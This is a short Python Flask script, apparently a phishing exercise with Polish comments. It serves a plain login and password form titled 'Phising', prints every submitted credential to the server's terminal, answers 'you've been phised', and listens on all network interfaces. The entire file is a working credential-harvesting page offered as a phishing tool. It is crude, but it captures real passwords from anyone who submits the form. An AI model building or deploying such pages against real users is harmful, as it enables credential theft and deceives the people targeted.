from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        login = request.form.get('login')
        haslo = request.form.get('haslo')
        print(f"Login: {login}, Haslo: {haslo}")  # Dane wypisane w terminalu
        return "you've been phised"
    return render_template_string('''<!doctype html>
<html>
<head><title>Phising</title></head>
<body>
    <form method="POST">
        <label>Login: <input type="text" name="login"></label><br>
        <label>Hasło: <input type="password" name="haslo"></label><br>
        <input type="submit" value="send">
    </form>
</body>
</html>''')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
